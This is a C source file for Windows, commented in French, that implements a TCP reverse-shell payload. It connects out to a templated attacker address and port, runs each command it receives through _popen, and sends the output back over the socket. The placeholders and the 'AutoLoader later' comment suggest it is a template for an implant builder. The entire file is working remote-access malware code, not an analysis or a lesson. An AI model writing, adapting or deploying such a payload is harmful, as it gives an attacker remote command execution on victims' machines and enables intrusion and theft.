#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <stdbool.h>
#include <stdio.h>

#include "libc.h"
#include "entrypoint.h"

#pragma comment(lib, "ws2_32.lib")
// UTF16("str") == L"str" # Wide Character String / UTF-16
#define _UTF16(x)   L##x
#define UTF16(x)    _UTF16(x)

// AutoLoader later

void entrypoint() {
    // MessageBoxA(0, "ReverseShell_TCP", "ReverseShell_TCP", 0);
    
    // Initialiser la bibliothèque WinSock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    const char* ip = %LHOST%;  // IP du serveur
    int port = %LPORT%;  // Le port du serveur

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Boucle pour recevoir des commandes et envoyer la sortie
    char buffer[1024];
    DWORD bytesRead;
    while (1) {
        // Réception de la commande du serveur
        int recvResult = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (recvResult == SOCKET_ERROR || recvResult == 0) {
            break;  // Si une erreur survient ou la connexion est fermée, quitter la boucle
        }

        // Ajouter un caractère de fin de chaîne
        buffer[recvResult] = '\0';

        // Exécuter la commande reçue
        FILE* pipe = _popen(buffer, "r");
        if (pipe == NULL) {
            // En cas d'erreur lors de l'exécution de la commande, envoyer une erreur au serveur
            const char* errorMsg = "Erreur lors de l'exécution de la commande.\n";
            send(sock, errorMsg, strlen(errorMsg), 0);
        } else {
            // Lire la sortie de la commande et l'envoyer au serveur
            while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                send(sock, buffer, strlen(buffer), 0);
            }
            fclose(pipe);
        }
    }

    // Fermer la socket et nettoyer les ressources
    closesocket(sock);
    WSACleanup();
}
